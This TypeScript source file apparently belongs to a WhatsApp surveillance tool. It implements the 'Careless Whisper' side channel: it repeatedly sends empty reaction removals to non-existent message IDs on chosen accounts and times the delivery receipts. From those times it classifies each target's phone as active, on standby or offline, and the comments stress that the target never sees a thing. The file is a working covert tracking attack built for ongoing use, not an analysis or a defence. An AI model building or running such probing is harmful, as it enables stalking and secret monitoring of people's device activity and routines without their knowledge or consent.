import { EventEmitter } from 'events';
import type { ConnectionManager } from '../whatsapp/connection-manager.js';
import { createChildLogger } from '../utils/logger.js';
import { DETECTION } from '../config/constants.js';
import type { RttSignal, RttClassification } from './types.js';

const log = createChildLogger('rtt-prober');

interface ProbeState {
  rttHistory: number[];
  recentRtt: number[];
  medianRtt: number | null;
  probeTimer: NodeJS.Timeout | null;
}

/**
 * Method 2: RTT Probing — "Careless Whisper" technique
 *
 * Based on the peer-reviewed "Careless Whisper" paper (Gegenhuber et al., 2024,
 * Best Paper Award at RAID 2025).
 *
 * Sends reaction REMOVALS (empty text '') to non-existent message IDs.
 * This is 100% invisible to the target:
 * - WhatsApp servers do NOT validate whether the message ID exists
 * - The reaction is forwarded to the target's device(s)
 * - Each device processes it and sends back a delivery receipt (CLIENT_ACK)
 * - Since the reaction references nothing, it is silently discarded
 * - No notification, no UI change, no visible artifact on the target's phone
 * - Removing a reaction (empty string) is "entirely invisible to the targeted user"
 *
 * The delivery receipt RTT reveals device state:
 * - Active (foreground): ~300-500ms
 * - Standby (screen off, WiFi): ~1-2s
 * - Standby (screen off, mobile): ~2-3s
 * - Offline: no response within timeout
 */
export class RttProber extends EventEmitter {
  private probeStates = new Map<string, ProbeState>();
  private pendingProbes = new Map<string, { sentAt: number; resolve: (rtt: number | null) => void; timer: NodeJS.Timeout }>();

  constructor(private readonly connection: ConnectionManager) {
    super();
  }

  /**
   * Start probing a set of JIDs.
   */
  async start(jids: string[]): Promise<void> {
    // Listen for message updates (delivery receipts / CLIENT_ACK)
    this.connection.onBaileysEvent('messages.update', (updates) => {
      for (const update of updates) {
        this.handleMessageUpdate(update);
      }
    });

    // Start probing each JID
    for (const jid of jids) {
      this.startProbing(jid);
    }

    log.info({ count: jids.length }, 'RTT prober started (Careless Whisper mode)');
  }

  /**
   * Start probing a specific JID.
   */
  startProbing(jid: string): void {
    if (this.probeStates.has(jid)) return;

    const state: ProbeState = {
      rttHistory: [],
      recentRtt: [],
      medianRtt: null,
      probeTimer: null,
    };

    state.probeTimer = setInterval(() => {
      this.probe(jid).catch(err => {
        log.error({ err, jid }, 'Probe failed');
      });
    }, DETECTION.RTT_PROBE_INTERVAL_MS);

    this.probeStates.set(jid, state);

    // Send first probe immediately
    this.probe(jid).catch(() => {});
  }

  /**
   * Stop probing a specific JID.
   */
  stopProbing(jid: string): void {
    const state = this.probeStates.get(jid);
    if (state?.probeTimer) {
      clearInterval(state.probeTimer);
    }
    this.probeStates.delete(jid);
  }

  /**
   * Stop all probing.
   */
  stop(): void {
    for (const [jid] of this.probeStates) {
      this.stopProbing(jid);
    }
    for (const [, pending] of this.pendingProbes) {
      clearTimeout(pending.timer);
      pending.resolve(null);
    }
    this.pendingProbes.clear();
    log.info('RTT prober stopped');
  }

  /**
   * Send a single silent RTT probe to a JID.
   *
   * Sends a reaction REMOVAL (empty string '') to a non-existent message ID.
   * This is entirely invisible — confirmed by the Careless Whisper research paper.
   * The target's device processes it silently and returns a delivery receipt.
   */
  private async probe(jid: string): Promise<void> {
    const sock = this.connection.socket;
    if (!sock || !this.connection.isConnected) return;

    // Generate a realistic fake message ID (matches WhatsApp's format)
    const fakeMessageId = `3EB0${this.randomHex(16)}`;
    const probeId = `${jid}:${fakeMessageId}`;
    const sentAt = Date.now();

    // Create a promise that resolves when we get the delivery receipt or timeout
    const rttPromise = new Promise<number | null>((resolve) => {
      const timer = setTimeout(() => {
        this.pendingProbes.delete(probeId);
        resolve(null); // Timeout = offline
      }, DETECTION.RTT_TIMEOUT_MS);

      this.pendingProbes.set(probeId, { sentAt, resolve, timer });
    });

    try {
      // Send a reaction REMOVAL (empty text = removal) to a non-existent message.
      // Empty string reaction = removing a reaction that doesn't exist = 100% invisible.
      // The server forwards it, the device processes it silently, sends back CLIENT_ACK.
      await sock.sendMessage(jid, {
        react: {
          text: '',  // Empty = reaction removal = completely invisible
          key: {
            remoteJid: jid,
            id: fakeMessageId,
            fromMe: false,
          },
        },
      });
    } catch {
      // If send fails, resolve as offline
      const pending = this.pendingProbes.get(probeId);
      if (pending) {
        clearTimeout(pending.timer);
        this.pendingProbes.delete(probeId);
      }
      this.emitRttSignal(jid, null);
      return;
    }

    const rttMs = await rttPromise;
    this.emitRttSignal(jid, rttMs);
  }

  /**
   * Handle delivery receipt / message ACK (status 3 = CLIENT_ACK).
   */
  private handleMessageUpdate(update: { key: { remoteJid?: string | null; id?: string | null }; update: Record<string, unknown> }): void {
    const jid = update.key.remoteJid;
    const msgId = update.key.id;
    if (!jid || !msgId) return;

    const probeId = `${jid}:${msgId}`;
    const pending = this.pendingProbes.get(probeId);
    if (!pending) return;

    const rttMs = Date.now() - pending.sentAt;
    clearTimeout(pending.timer);
    this.pendingProbes.delete(probeId);
    pending.resolve(rttMs);
  }

  /**
   * Process RTT result and emit a classified signal.
   */
  private emitRttSignal(jid: string, rttMs: number | null): void {
    const state = this.probeStates.get(jid);
    if (!state) return;

    // Update history
    if (rttMs !== null) {
      state.rttHistory.push(rttMs);
      if (state.rttHistory.length > DETECTION.RTT_HISTORY_SIZE) {
        state.rttHistory.shift();
      }

      state.recentRtt.push(rttMs);
      if (state.recentRtt.length > DETECTION.RTT_MOVING_AVG_WINDOW) {
        state.recentRtt.shift();
      }

      // Recalculate median
      if (state.rttHistory.length >= 5) {
        const sorted = [...state.rttHistory].sort((a, b) => a - b);
        const mid = Math.floor(sorted.length / 2);
        state.medianRtt = sorted.length % 2 === 0
          ? (sorted[mid - 1] + sorted[mid]) / 2
          : sorted[mid];
      }
    }

    // Calculate moving average
    const movingAvg = state.recentRtt.length > 0
      ? state.recentRtt.reduce((sum, v) => sum + v, 0) / state.recentRtt.length
      : null;

    // Classify using dynamic threshold (median * 0.9)
    let classification: RttClassification;
    if (rttMs === null) {
      classification = 'OFFLINE';
    } else if (state.medianRtt !== null && movingAvg !== null) {
      classification = movingAvg < state.medianRtt * DETECTION.RTT_ACTIVE_THRESHOLD_FACTOR
        ? 'ACTIVE'
        : 'STANDBY';
    } else {
      // Not enough history yet, use absolute threshold
      classification = rttMs < 800 ? 'ACTIVE' : 'STANDBY';
    }

    const signal: RttSignal = {
      method: 'rtt',
      jid,
      rttMs,
      movingAvg,
      medianRtt: state.medianRtt,
      classification,
      timestamp: new Date(),
    };

    log.debug({ jid, rttMs, classification, movingAvg, median: state.medianRtt }, 'RTT probe result');
    this.emit('signal', signal);
  }

  /**
   * Generate a random hex string of the specified length.
   */
  private randomHex(length: number): string {
    const chars = '0123456789ABCDEF';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars[Math.floor(Math.random() * 16)];
    }
    return result;
  }
}
